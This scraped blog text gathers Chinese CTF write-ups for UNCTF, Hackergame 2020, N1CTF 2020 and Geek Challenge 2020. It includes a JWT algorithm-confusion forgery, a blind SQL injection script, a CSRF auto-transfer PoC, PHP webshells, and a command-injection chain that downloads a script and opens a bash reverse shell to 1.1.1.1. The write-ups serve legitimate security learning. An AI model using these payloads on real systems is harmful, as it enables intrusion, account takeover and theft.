if(discr&gt;=0): t = is_perfect_square(discr) if t!=-1 and (s+t)%2==0: print(&quot;Hacked!&quot;) return de= 18437613570247445737704630776150775735509244525633303532921813122997549954741828855898842356900537746647414676272022397989161180996467240795661928117273837666615415153571959258847829528131519423486261757569454011940318849589730152031528323576997801788206457548531802663834418381061551227544937412734776581781n= 147282573611984580384965727976839351356009465616053475428039851794553880833177877211323318130843267847303264730088424552657129314295117614222630326581943132950689147833674506592824134135054877394753008169629583742916853056999371985307138775298080986801742942833212727949277517691311315098722536282119888605701c= 140896698267670480175739817539898638657099087197096836734243016824204113452987617610944986742919793506024892638851339015015706164412994514598564989374037762836439262224649359411190187875207060663509777017529293145434535056275850555331099130633232844054767057175076598741233988533181035871238444008366306956934d = hack_RSA(e,n)m = pow(c,d,n)print(libnum.n2s(m)) wingWindings2字体 一一对照就行 signin题目： 12345678910111213141516171819202122232425262728293031323334import randomfrom Crypto.Cipher import AESfrom os import urandomfrom string import printablefrom binascii import hexlifyfrom secret import flagrandom.seed(urandom(32))key1 = &#x27;0&#x27;*13 + &#x27;&#x27;.join([random.choice(printable) for _ in range(3)])key2 = &#x27;&#x27;.join([random.choice(printable) for _ in range(3)]) + &#x27;0&#x27;*13cipher1 = AES.new(key=key1.encode(), mode=AES.MODE_ECB)cipher2 = AES.new(key=key2.encode(), mode=AES.MODE_ECB)pt = input(&quot;You have a chance to get something: &quot;)pt = pt.encode()val = len(pt) % 16if not val == 0: pt += b&#x27;\\x00&#x27;*(16 - val)c1 = cipher1.encrypt(pt)c2 = cipher2.encrypt(c1)print(&#x27;Your cipher:&#123;&#125;&#x27;.format(hexlify(c2)))assert(len(flag) % 16 == 0)c3 = cipher1.encrypt(flag)c4 = cipher2.encrypt(c3)print(&#x27;Your flag:&#123;&#125;&#x27;.format(hexlify(c4)))# You have a chance to get something: UNCTF2020_Enjoy_Crypto~# Your cipher:b&#x27;01a4e429e76db218fa0eb18f03ec69c9200a2362d8b4d7ea46170ce698389bbd&#x27;# Your flag:b&#x27;196cc94c2d685beb54beeaa14c1dc0a6f3794d65fca0d1a1274515166e4255ab367383092e42d774992f74bc138faaad&#x27; UNCTF 2019简单的备忘录看到是graphql 这是个啥呢？ GraphQL 是一种针对 Graph（图状数据）进行查询特别有优势的 Query Language（查询语言），所以叫做 GraphQL。它跟 SQL 的关系是共用 QL 后缀，就好像「汉语」和「英语」共用后缀一样，但他们本质上是不同的语言。GraphQL 跟用作存储的 NoSQL 没有必然联系，虽然 GraphQL 背后的实际存储可以选择 NoSQL 类型的数据库，但也可以用 SQL 类型的数据库，或者任意其它存储方式（例如文本文件、存内存里等等）。","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"}]},{"title":"Hackgame2020部分writeup","slug":"Hackgame2020部分writeup","date":"2020-11-02T11:14:45.000Z","updated":"2020-11-29T04:28:41.812Z","comments":true,"path":"2020/11/02/Hackgame2020部分writeup/","link":"","permalink":"http://www.moonback.xyz/2020/11/02/Hackgame2020%E9%83%A8%E5%88%86writeup/","excerpt":"wtcl!打了这麽久ctf感觉还是个萌新！","text":"wtcl!打了这麽久ctf感觉还是个萌新！ 官方writeup:https://github.com/USTC-Hackergame/hackergame2020-writeups 2048在/static/js/html_actuator.js看到 在控制台敲下 访问getflxg?my_favorite_fruit=banana得到flag 一闪而过的 Flag直接cmd运行就能得到flag 从零开始的记账工具人把xlsx的两列复制出来粘贴到num.txt 找到这篇博客脚本：https://blog.csdn.net/gaoxing412836542/article/details/106302441/ 不乘上100会有精度问题 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115package com.rock;import java.io.*;import java.math.BigDecimal;public class exp &#123; /** * 中文简体 */ public static final String[] RMB_NUMBERS = new String[]&#123;&quot;一&quot;, &quot;二&quot;, &quot;三&quot;, &quot;四&quot;, &quot;五&quot;, &quot;六&quot;, &quot;七&quot;, &quot;八&quot;, &quot;九&quot;, &quot;零&quot;&#125;; /** * 中文繁体 */ public static final String[] BIG_RMB_NUMBERS = new String[]&#123;&quot;壹&quot;, &quot;贰&quot;, &quot;叁&quot;, &quot;肆&quot;, &quot;伍&quot;, &quot;陆&quot;, &quot;柒&quot;, &quot;捌&quot;, &quot;玖&quot;, &quot;零&quot;&#125;; /** * 与汉字相应的转化的数字 */ public static final Long[] TO_ARABIC_NUMBERS = new Long[]&#123;1L, 2L, 3L, 4L, 5L, 6L, 7L, 8L, 9L, 0L&#125;; /** * 人民币单位关键词 简写（大写数字倍数，一定要由大到小） */ public static final String[] RMB_UNIT = new String[]&#123;&quot;亿&quot;, &quot;万&quot;, &quot;千&quot;, &quot;百&quot;, &quot;十&quot;, &quot;元&quot;, &quot;角&quot;, &quot;分&quot;, &quot;厘&quot;&#125;; /** * 繁体 */ public static final String[] BIG_RMB_UNIT = new String[]&#123;&quot;億&quot;, &quot;萬&quot;, &quot;仟&quot;, &quot;佰&quot;, &quot;拾&quot;, &quot;圆&quot;, &quot;角&quot;, &quot;分&quot;, &quot;厘&quot;&#125;; /** * 与人民币单位关键词对应的基数 */ public static final BigDecimal[] TO_CARDINAL_NUMBERS = new BigDecimal[]&#123; new BigDecimal(100000000L), new BigDecimal(10000L), new BigDecimal(1000L), new BigDecimal(100L), BigDecimal.TEN, BigDecimal.ONE, new BigDecimal(&quot;0.1&quot;), new BigDecimal(&quot;0.01&quot;), new BigDecimal(&quot;0.001&quot;) &#125;; /** * 大写转化为小写的过程操作 */ public static BigDecimal ChineseToNumber(String money) &#123; BigDecimal number = getDigitalNum(money); //return Double.parseDouble(number.toString()); //return number.toString(); return new BigDecimal(number.toString()); &#125; /** * 辅助类，处理中文数字转换成阿拉伯数字，利用递归算法 * * @return */ public static BigDecimal getDigitalNum(String money) &#123; BigDecimal result = BigDecimal.ZERO; if ((money == null || money.trim().length() &lt;= 0)) &#123; return result; &#125; //匹配大写金额的单位 for (int i = 0; i &lt; RMB_UNIT.length; i++) &#123; //查找字符中的简繁单位 int index = money.lastIndexOf(RMB_UNIT[i]) == -1 ? money.lastIndexOf(BIG_RMB_UNIT[i]) : money.lastIndexOf(RMB_UNIT[i]); if (index &gt;= 0) &#123; String pre_money = money.substring(0, index);//截取当前单位前面的中文字符串 money = money.substring(index + 1);//截取当前单位后面的字符串，进行下一次迭代比较 if ((pre_money == null || pre_money.length() &lt;= 0) &amp;&amp; TO_CARDINAL_NUMBERS[i].intValue() == 10) &#123; //处理拾开头的特殊字符例如拾、十 result = result.add(TO_CARDINAL_NUMBERS[i]); &#125; else &#123; //对当前单位截取的前面的字符递归处理 result = result.add(getDigitalNum(pre_money).multiply(TO_CARDINAL_NUMBERS[i])); &#125; &#125; &#125; //如果不带单位直接阿拉伯数字匹配替换 if (money != null &amp;&amp; money.length() &gt; 0) &#123; result = result.add(getArabicNumByBig(money)); &#125; return result; &#125; /** * 辅助类中文数字转为对应阿拉伯数字 * * @return */ public static BigDecimal getArabicNumByBig(String big) &#123; BigDecimal result = BigDecimal.ZERO; for (int j = 0; j &lt; RMB_NUMBERS.length; j++) &#123; big = big.replaceAll(RMB_NUMBERS[j], TO_ARABIC_NUMBERS[j].toString());//中文小写替换 big = big.replaceAll(BIG_RMB_NUMBERS[j], TO_ARABIC_NUMBERS[j].toString());//中文大写替换 &#125; try &#123; result = new BigDecimal(big); &#125; catch (Exception e) &#123; result = BigDecimal.ZERO; &#125; return result; &#125; public static void main (String[] args) throws IOException &#123; File file = new File(&quot;D:\\\\code\\\\Java\\\\exploit\\\\src\\\\main\\\\java\\\\com\\\\rock\\\\num.txt&quot;); InputStreamReader inputReader = new InputStreamReader(new FileInputStream(file)); BufferedReader bf = new BufferedReader(inputReader); // 按行读取字符串 String str; int m=0; while ((str = bf.readLine()) != null) &#123; String [] arr = str.split(&quot;\\\\s+&quot;); Double moneny = ChineseToNumber(arr[0]).doubleValue(); int n = ChineseToNumber(arr[1]).intValue(); m= (int) (m + n*moneny*100); &#125; System.out.println(m); &#125;&#125; 我写的稍微有点问题 看下官方wp吧 首先使用 Excel（或者其他商业的、开源的、在线的电子表格工具）将下载的文件转换为 .csv 格式，即逗号分隔的文本 在 Python 中安装 cn2an 这个中文数字转换的库： 1python3 -m pip install cn2an 然后使用 Python 程序处理这个文件： 1234567891011121314151617import cn2anlines = open(&#x27;bills.csv&#x27;).readlines()[1:]s = 0for line in lines: a, b = line.strip().split(&#x27;,&#x27;) n = 0 if &#x27;元&#x27; in a: y, a = a.split(&#x27;元&#x27;) n += cn2an.cn2an(y, &quot;smart&quot;) if &#x27;角&#x27; in a: y, a = a.split(&#x27;角&#x27;) n += cn2an.cn2an(y, &quot;smart&quot;) / 10 if &#x27;分&#x27; in a: y, a = a.split(&#x27;分&#x27;) n += cn2an.cn2an(y, &quot;smart&quot;) / 100 s += n * int(b)print(s) 最后输出的结果可能有一些浮点误差，自己四舍五入一下就好了。（更好的办法是使用整数来计算） 还有一种方法： 使用任意文本编辑器（或者 Excel 本身）做字符串替换，替换规则如下： 123456789101112131415161718&#39;零&#39; -&gt; &#39;&#39;&#39;壹&#39; -&gt; &#39;1&#39;&#39;贰&#39; -&gt; &#39;2&#39;&#39;叁&#39; -&gt; &#39;3&#39;&#39;肆&#39; -&gt; &#39;4&#39;&#39;伍&#39; -&gt; &#39;5&#39;&#39;陆&#39; -&gt; &#39;6&#39;&#39;柒&#39; -&gt; &#39;7&#39;&#39;捌&#39; -&gt; &#39;8&#39;&#39;玖&#39; -&gt; &#39;9&#39;&#39;拾&#39; -&gt; &#39;*10+&#39;&#39;佰&#39; -&gt; &#39;*100+&#39;&#39;仟&#39; -&gt; &#39;*1000+&#39;&#39;元&#39; -&gt; &#39;+&#39;&#39;角&#39; -&gt; &#39;&#x2F;10+&#39;&#39;分&#39; -&gt; &#39;&#x2F;100&#39;&#39;++&#39; -&gt; &#39;+&#39;&#39;整&#39; -&gt; &#39;&#39; 然后如果开头有乘号或者结尾有加号，去掉即可，这样的数学表达式求值即可得到正确的结果。太骚了2333 exp: 123456789sum=0for i in open(&#x27;1.txt&#x27;).readlines(): c=i.strip() if c[0]==&#x27;*&#x27;: c=c[1:-1] elif c[-1]==&#x27;+&#x27;: c=c[:-1] sum+=eval(c)print(sum) 233 同学的 Docker首先pull过来 镜像名字其实就有提示 1docker pull 8b8d3c8324c7/stringtool 打包到本地 1docker save 8b8d3c8324c7/stringtool &gt; flag.tar 查找flag 1strings flag.tar | grep &quot;flag&#123;&quot; 普通的身份认证器jwt 放到jwt.io提示签名算法是RS256 源码中有 后端框架使用的是 FastAPI，一个快速的 Python Web API 框架，文档地址： https://fastapi.tiangolo.com/ FastAPI 会给网站自动生成 API 文档，路径在 /docs。点开来查看之后，就能看到一个隐藏的 route /debug，访问一下，就能看到它把公钥吐出来了 考察的是CVE-2017-11424 在非对称密码中，公钥确实是可以公开的。但是这就牵扯到了 JWT 格式的问题：它的签名算法除了支持 RSA 签名以外，还支持对称的 HMAC 签名（例如 HS256），并且修改 JWT 中的签名算法只需要修改 header 的 alg 字段，并且通过某些方法，仍然让程序认为整个 JWT 是完好而未被篡改的即可。 在使用 RS256 时，程序的流程是： 使用私钥为 JWT 签名。 使用公钥验证接收到的 JWT 的完整性。 而在使用 HS256 时，程序的流程是： 使用密钥为 JWT 签名。 同样，使用这个密钥验证 JWT 的完整性。显然，这个密钥不能被泄露出来。 那么如果我们知道公钥，那么我们就能这么做： 接收到一个合法的，使用 RS256 签名算法的 JWT。 修改 JWT 的 payload 我们想要的样子，同时修改 header 的算法为 HS256。 使用已知的公钥，以 HS256 算法重新签名我们修改后的公钥。 发给服务器。此时，服务器使用公钥 + HS256 算法检查 JWT，发现没有问题，就会认为这是一个合法的 JWT。 目前的 JWT 库基本上都修复了这个问题。 PyJWT（以及其他很多 JWT 库）修复这个安全漏洞的方式是：当使用 HS256 encode/decode 的时候，检查密钥的开头是否是非对称加密的公钥，如果是，就报错。可以直接魔改 jwt/algorithms.py 把这一部分的校验去掉，也可以降级到有问题的版本（1.5.0）然后再跑 exp。 安装PyJWT 1pip3 install PyJWT==1.5.0 exp: 123456789101112import jwtPUBLIC_KEY = &quot;-----BEGIN RSA PUBLIC KEY-----\\nMIICCgKCAgEAn/KiHQ+/zwE7kY/Xf89PY6SowSb7CUk2b+lSVqC9u+R4BaE/5tNF\\neNlneGNny6fQhCRA+Pdw1UJSnNpG26z/uOK8+H7fMb2Da5t/94wavw410sCKVbvf\\nft8gKquUaeq//tp20BETeS5MWIXp5EXCE+lEdAHgmWWoMVMIOXwaKTMnCVGJ2SRr\\n+xH9147FZqOa/17PYIIHuUDlfeGi+Iu7T6a+QZ0tvmHL6j9Onk/EEONuUDfElonY\\nM688jhuAM/FSLfMzdyk23mJk3CKPah48nzVmb1YRyfBWiVFGYQqMCBnWgoGOanpd\\n46Fp1ff1zBn4sZTfPSOus/+00D5Lxh6bsbRa6A1vAApfmTcu026lIb7gbG7DU1/s\\neDId9s1qA5BJpzWFKO4ztkPGvPTUok8hQBMDaSH1JOoFQgfJIfC7w2CQe+KbodQL\\n3akKQDCZhcoA4tf5VC6ODJpFxCn6blML5cD6veOBPJiIk8DBRgmt2AHzOUju+5ns\\nQcplOVxW5TFYxLqeJ8FPWqQcVekZ749FjchtAwPlUsoWIH0PTSun38ua8usrwTXb\\npBlf4r0wz22FPqaecvp7z6Rj/xfDauDGDSU4hmn/TY9Fr+OmFJPW/9k2RAv7KEFv\\nFCLP/3U3r0FMwSe/FPHmt5fjAtsGlZLj+bZsgwFllYeD90VQU8Ds+KkCAwEAAQ==\\n-----END RSA PUBLIC KEY-----\\n&quot;payload = &#123; &quot;sub&quot;: &quot;admin&quot;, &quot;exp&quot;: 9602085613, # fill in any number you like&#125;encoded = jwt.encode(payload, PUBLIC_KEY, algorithm=&#x27;HS256&#x27;)print(encoded)# eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6OTYwMjA4NTYxM30.2oxpg6KALSg37msshI8Oddi1TgspKdxoPzOJ0Zyt77I","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"}]},{"title":"N1CTF2020部分题目writeup","slug":"N1CTF2020部分题目writeup","date":"2020-10-18T05:23:10.000Z","updated":"2020-10-20T10:40:24.244Z","comments":true,"path":"2020/10/18/N1CTF2020部分题目writeup/","link":"","permalink":"http://www.moonback.xyz/2020/10/18/N1CTF2020%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/","excerpt":"wtcl!","text":"wtcl! webSignIn源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?php class ip &#123; public $ip; public function waf($info)&#123; &#125; public function __construct() &#123; if(isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]))&#123; $this-&gt;ip = $this-&gt;waf($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]); &#125;else&#123; $this-&gt;ip =$_SERVER[&quot;REMOTE_ADDR&quot;]; &#125; &#125; public function __toString()&#123; $con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;********&quot;,&quot;n1ctf_websign&quot;); $sqlquery=sprintf(&quot;INSERT into n1ip(`ip`,`time`) VALUES (&#x27;%s&#x27;,&#x27;%s&#x27;)&quot;,$this-&gt;waf($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]),time()); if(!mysqli_query($con,$sqlquery))&#123; return mysqli_error($con); &#125;else&#123; return &quot;your ip looks ok!&quot;; &#125; mysqli_close($con); &#125;&#125;class flag &#123; public $ip; public $check; public function __construct($ip) &#123; $this-&gt;ip = $ip; &#125; public function getflag()&#123; if(md5($this-&gt;check)===md5(&quot;key****************&quot;))&#123; readfile(&#x27;/flag&#x27;); &#125; return $this-&gt;ip; &#125; public function __wakeup()&#123; if(stristr($this-&gt;ip, &quot;n1ctf&quot;)!==False) $this-&gt;ip = &quot;welcome to n1ctf2020&quot;; else $this-&gt;ip = &quot;noip&quot;; &#125; public function __destruct() &#123; echo $this-&gt;getflag(); &#125;&#125;if(isset($_GET[&#x27;input&#x27;]))&#123; $input = $_GET[&#x27;input&#x27;]; unserialize($input);&#125; 感觉可以直接绕过__wakeup通过报错注入的方法来 但测得不行 不知道为啥 没办法 用报错注入的bool盲注方法 可以看到数据库名字为n1ctf_websign 包含n1ctf 看下图吧 所以就可以把database()位置替换成判断了 exp: 12345678910111213141516171819202122232425262728293031import requestsurl=&#x27;http://101.32.205.189/?input=O:4:&quot;flag&quot;:2:&#123;s:2:&quot;ip&quot;;O:2:&quot;ip&quot;:1:&#123;s:2:&quot;ip&quot;;N;&#125;s:5:&quot;check&quot;;N;&#125;&#x27;flag=&#x27;&#x27;for i in range(1,500): f1=flag top=127 low=33 while low&lt;=top: mid=(top+low)//2 p1=&quot;1&#x27; or updatexml(1,concat(0x7c,if(ascii(substr((select group_concat(`key`) from n1key),&#123;&#125;,1))&gt;&#123;&#125;,database(),0)),1) or &#x27;&quot;.format(str(i),str(mid)) p2=&quot;1&#x27; or updatexml(1,concat(0x7c,if(ascii(substr((select group_concat(`key`) from n1key),&#123;&#125;,1))=&#123;&#125;,database(),0)),1) or &#x27;&quot;.format(str(i),str(mid)) headers1=&#123;&#x27;X-Forwarded-For&#x27;:p1&#125; headers2=&#123;&#x27;X-Forwarded-For&#x27;:p2&#125; try: r1=requests.get(url,headers=headers2) print(i,mid) if &#x27;&lt;code&gt;welcome to n1ctf2020&lt;/code&gt;&#x27; in r1.text: flag+=chr(mid) print(flag) break r=requests.get(url,headers=headers1) if &#x27;&lt;code&gt;welcome to n1ctf2020&lt;/code&gt;&#x27; in r.text: low=mid+1 else: top=mid-1 except Exception as e: pass if flag==f1: break 注意最后的key要加上反引号 key是mysql的保留字 参考：https://www.cnblogs.com/yangzailu/p/6694000.html 接着序列化就行 12345678910111213141516171819&lt;?php class ip &#123; public $ip; public function __construct()&#123; &#125;&#125;class flag &#123; public $ip; public $check; public function __construct() &#123; $this-&gt;ip = new ip(); $this-&gt;check = &#x27;n1ctf20205bf75ab0a30dfc0c&#x27;; &#125;&#125;$a = new flag();echo serialize($a); The King Of Phish (Victim Bot)源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243# Victim botimport osimport subprocessimport uuidimport LnkParse3 as Lnkfrom flask import Flask, requestapp = Flask(__name__)@app.route(&#x27;/&#x27;)def index(): source = open(__file__, &#x27;r&#x27;).read().replace(&quot;\\n&quot;, &quot;\\x3c\\x62\\x72\\x3e&quot;).replace(&quot; &quot;, &quot;\\x26\\x6e\\x62\\x73\\x70\\x3b&quot;) return source@app.route(&#x27;/send&#x27;, methods=[&#x27;POST&#x27;])def sendFile(): if &#x27;file&#x27; not in request.files: return &#x27;No file part&#x27; file = request.files[&#x27;file&#x27;] if file.filename == &#x27;&#x27;: return &#x27;No selected file&#x27; data = file.stream.read() if not data.startswith(b&quot;\\x4c\\x00&quot;): return &quot;You&#x27;re a bad guy!&quot; shortcut = Lnk.lnk_file(indata=data) if shortcut.data[&#x27;command_line_arguments&#x27;].count(&quot; &quot;): return &quot;File is killed by antivirus.&quot; filename = str(uuid.uuid4())+&quot;.lnk&quot; fullname = os.path.join(os.path.abspath(os.curdir) + &quot;/uploads&quot;, filename) open(fullname, &quot;wb&quot;).write(data) clickLnk(fullname) return &quot;Clicked.&quot;def clickLnk(lnkPath): subprocess.run(&#x27;cmd /c &quot;%s&quot;&#x27; % lnkPath, capture_output=True, shell=True, check=True)if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=5000)","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"}]},{"title":"极客大挑战2020部分writeup","slug":"极客大挑战2020部分writeup","date":"2020-10-17T02:54:04.000Z","updated":"2021-04-08T11:04:47.520Z","comments":true,"path":"2020/10/17/极客大挑战2020部分writeup/","link":"","permalink":"http://www.moonback.xyz/2020/10/17/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020%E9%83%A8%E5%88%86writeup/","excerpt":"之前就是这个比赛入门的 二战😁、","text":"之前就是这个比赛入门的 二战😁、 webWelcomehttp状态码405 改成post请求得到源码 1234567891011121314 &lt;?phperror_reporting(0);if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] !== &#x27;POST&#x27;) &#123;header(&quot;HTTP/1.1 405 Method Not Allowed&quot;);exit();&#125; else &#123; if (!isset($_POST[&#x27;roam1&#x27;]) || !isset($_POST[&#x27;roam2&#x27;]))&#123; show_source(__FILE__); &#125; else if ($_POST[&#x27;roam1&#x27;] !== $_POST[&#x27;roam2&#x27;] &amp;&amp; sha1($_POST[&#x27;roam1&#x27;]) === sha1($_POST[&#x27;roam2&#x27;]))&#123; phpinfo(); // collect information from phpinfo! &#125;&#125; 数组绕过sha1比较 payload: 1POST: roam1[]&#x3D;1&amp;roam2[]&#x3D;2 在phpinfo中看到这个 访问 在http头中找到flag flagshop注册登录 发现有个转账和报告给功能 计算md5脚本 1234567import hashlibflag=&quot;341f5&quot;for i in range(1, 1000000000000000): s = hashlib.md5(str(i).encode()).hexdigest()[:5] if s == flag: print(i) break 之前一直以为是xss 试了好久无果 后来给hint 提示是csrf 参考：https://www.mi1k7ea.com/2020/01/21/CSRF-Tricks%E5%B0%8F%E7%BB%93/ bp生成payload: 123456789101112131415&lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; &lt;form action=&quot;http://173.82.206.142:8005/transfer.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;target&quot; value=&quot;MoonBack&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;money&quot; value=&quot;100000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;messages&quot; value=&quot;1&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt; &lt;/form&gt; &lt;/body&gt; &lt;script&gt; var m = document.getElementsByTagName(&#x27;form&#x27;)[0]; m.submit(); &lt;/script&gt;&lt;/html&gt; 放到服务器上 报告内容里是发现会请求 1&lt;script&gt;location=&quot;http://1.1.1.1/csrf.html&quot;;&lt;/script&gt; 然后报告 钱就会蹭蹭的涨了 朋友的学妹查看源码 base64解密就行 EZwww源码泄露 www.zip index.php 123456789&lt;?php$key1 = $_POST[&#x27;a&#x27;];$key2 = base64_decode(&#x27;c3ljbDB2ZXI=&#x27;);if($key1 === $key2)&#123; //this is a true flagecho &#x27;&lt;p&gt;SYC&#123;xxxxxxxxxxxxxxxxxx&#125;&lt;/p&gt;&#x27;;&#125;?&gt; payload: 1a&#x3D;sycl0ver EZgitgit_extarct恢复得到flag：https://github.com/gakki429/Git_Extract 刘壮的黑页12345678&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);$username = $_GET[&#x27;username&#x27;];$passwd = $_POST[&#x27;passwd&#x27;];if ($username === &#x27;admin&#x27; &amp;&amp; $passwd === &#x27;syclover&#x27;) &#123; echo $flag;&#125; 提交就行： 我是大黑客源码有提示 访问liuzhuang.php.bak 123456&lt;?phpeval($_POST[&#x27;liuzhuang&#x27;]);//谁是大恶人 那必定是我liuzhuang//当你的服务器看到 0xliuzhuang 就知道要买台新机器了?&gt; POST: 1liuzhuang&#x3D;system(&#39;cat &#x2F;flag &#39;); ezbypass 知X堂的php教程有两个功能 ，目录里文件列举 任意文件读取 ，读源码： displaySourceCode.php 123456789101112131415161718192021&lt;?phpinclude(&quot;waf.php&quot;);// 使用fopen打开一个文件；如果不能打开，则给出信息。$filename = $_GET[&#x27;phpfile&#x27;];// 注意下面，会导致XSS// $myfile = fopen($filename, &quot;r&quot;) or die (&quot;Cannot open $filename&quot;);$myfile = fopen($filename, &quot;r&quot;) or die(html(&quot;Cannot open $filename&quot;));print (&quot;&lt;xmp style=&#x27;font-size: +2ex&#x27;&gt;&quot;);do &#123; $line = fgets($myfile, 1024); print (&quot;$line&quot;);&#125; while(!feof($myfile));print (&quot;&lt;/xmp&gt;&quot;);// 关闭文件fclose($myfile);?&gt; listdir.php 123456789101112131415161718192021222324&lt;?phpinclude(&quot;waf.php&quot;);// 设置目录名称并进行扫描。$search_dir = $_GET[&#x27;dirname&#x27;];$title = &quot;教案&quot;;// 防止命令注入$search_dir = shellWaf($search_dir);//$contents = scandir($search_dir); 或者使用exec(&quot;ls $search_dir&quot;, $contents);print &quot;&lt;h1&gt;$title&lt;/h1&gt;&lt;hr/&gt;&lt;br/&gt;&quot;;// 列出文件。foreach ($contents as $item) &#123; if ( is_file($search_dir . &#x27;/&#x27; . $item) AND substr($item, 0, 1) != &#x27;.&#x27; ) &#123; // 打印信息。 print &quot;&lt;a href=\\&quot;displaySourceCode.php?phpfile=$search_dir/$item\\&quot;&gt;$item&lt;/a&gt;&lt;br/&gt;&quot;; &#125;&#125;?&gt; waf.php 1234567891011&lt;?php// 防御XSSfunction html($string) &#123; return htmlspecialchars($string);&#125;// 防御命令注入function shellWaf($string) &#123; return preg_replace(&quot;/(&amp;)|(\\|)|(&gt;)|(&lt;)/i&quot;, &quot;&quot;, $string);&#125; 关键肯定是listdir.php了 无回显命令 反弹shell 先把反弹shell的命令写到文件里 然后再执行文件 payload: 1listdir.php?dirname&#x3D;;curl 1.1.1.1&#x2F;1.txt -o &#x2F;tmp&#x2F;moonback 反弹shell的命令： 12#!/bin/shcurl 1.1.1.1|bash 1.1.1.1放的是 1bash -i &gt;&amp; /dev/tcp/1.1.1.1/9000 0&gt;&amp;1 不知道为啥下面这样不行 12#!/bin/shbash -i &gt;&amp; /dev/tcp/1.1.1.1/9000 0&gt;&amp;1 请求： 1listdir.php?dirname&#x3D;;. &#x2F;tmp&#x2F;moonback 又学到一点东西 12$PS2 &#x3D;&#x3D;&gt; &gt;$PS4 &#x3D;&#x3D;&gt; + Myblogphp伪协议读源码： 1index.php?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;home login.php: 12345&lt;?phprequire_once(&quot;secret.php&quot;);mt_srand($secret_seed);$_SESSION[&#x27;password&#x27;] = mt_rand();?&gt; secret.php: 123&lt;?php$secret_seed = mt_rand();?&gt; admin/user.php: 12345678910111213141516171819202122232425262728293031&lt;?phperror_reporting(0);session_start();$logined = false;if (isset($_POST[&#x27;username&#x27;]) and isset($_POST[&#x27;password&#x27;]))&#123; if ($_POST[&#x27;username&#x27;] === &quot;Longlone&quot; and $_POST[&#x27;password&#x27;] == $_SESSION[&#x27;password&#x27;])&#123; // No one knows my password, including myself $logined = true; $_SESSION[&#x27;status&#x27;] = $logined; &#125;&#125;if ($logined === false &amp;&amp; !isset($_SESSION[&#x27;status&#x27;]) || $_SESSION[&#x27;status&#x27;] !== true)&#123; echo &quot;&lt;script&gt;alert(&#x27;username or password not correct!&#x27;);window.location.href=&#x27;index.php?page=login&#x27;;&lt;/script&gt;&quot;; die();&#125;?&gt;&lt;?phpif(isset($_FILES[&#x27;Files&#x27;]) and $_SESSION[&#x27;status&#x27;] === true)&#123; $tmp_file = $_FILES[&#x27;Files&#x27;][&#x27;name&#x27;]; $tmp_path = $_FILES[&#x27;Files&#x27;][&#x27;tmp_name&#x27;]; if(($extension = pathinfo($tmp_file)[&#x27;extension&#x27;]) != &quot;&quot;)&#123; $allows = array(&#x27;gif&#x27;,&#x27;jpeg&#x27;,&#x27;jpg&#x27;,&#x27;png&#x27;); if(in_array($extension,$allows,true) and in_array($_FILES[&#x27;Files&#x27;][&#x27;type&#x27;],array_map(function($ext)&#123;return &#x27;image/&#x27;.$ext;&#125;,$allows),true))&#123; $upload_name = sha1(md5(uniqid(microtime(true), true))).&#x27;.&#x27;.$extension; move_uploaded_file($tmp_path,&quot;assets/img/upload/&quot;.$upload_name); echo &quot;&lt;script&gt;alert(&#x27;Update image -&gt; assets/img/upload/$&#123;upload_name&#125;&#x27;) &lt;/script&gt;&quot;; &#125; else &#123; echo &quot;&lt;script&gt;alert(&#x27;Update illegal! Only allows like \\&#x27;gif\\&#x27;, \\&#x27;jpeg\\&#x27;, \\&#x27;jpg\\&#x27;, \\&#x27;png\\&#x27; &#x27;) &lt;/script&gt;&quot;; &#125; &#125;&#125;?&gt; session_start()会把之前生成的随机数的清空 因此 只需构造 12POST:username&#x3D;Longlone&amp;password&#x3D; 上传文件 上传的时候有个坑 就是不能通过admin/user.php上传 这样虽然提示上传成功 实际并没有 要通过?page=admin/user 包含phar或者zip协议就行 生成phar的代码: 123&lt;?php$p = new PharData(dirname(__FILE__).&#x27;/phartest.gif&#x27;, 0,&#x27;phartest&#x27;,Phar::ZIP) ; $p-&gt;addFromString(&#x27;1.php&#x27;, &#x27;&lt;?php phpinfo();eval($_POST[1])?&gt;&#x27;); zip直接用bandzip压缩就行 payload: 12?page&#x3D;phar:&#x2F;&#x2F;assets&#x2F;img&#x2F;upload&#x2F;026a2ebc7d2a62c61a4fd63cbb0334fad3f63047.gif&#x2F;1?page&#x3D;zip:&#x2F;&#x2F;assets&#x2F;img&#x2F;upload&#x2F;ebabf538756721c8195c169b1a5839b9e2c6b061.gif%23a 忏悔的刘壮发现要提交答案 并且答案在cookie里 写脚本： 123456789101112import requestsu = &#x27;http://120.79.197.4:5000/&#x27;s = requests.session()c = s.get(u).cookies[&#x27;answer&#x27;]while 1: data = &#123;&#x27;answer&#x27;:c&#125; r = s.post(u+&#x27;check&#x27;,data=data) if &#x27;answer&#x27; in r.cookies: c = r.cookies[&#x27;answer&#x27;] 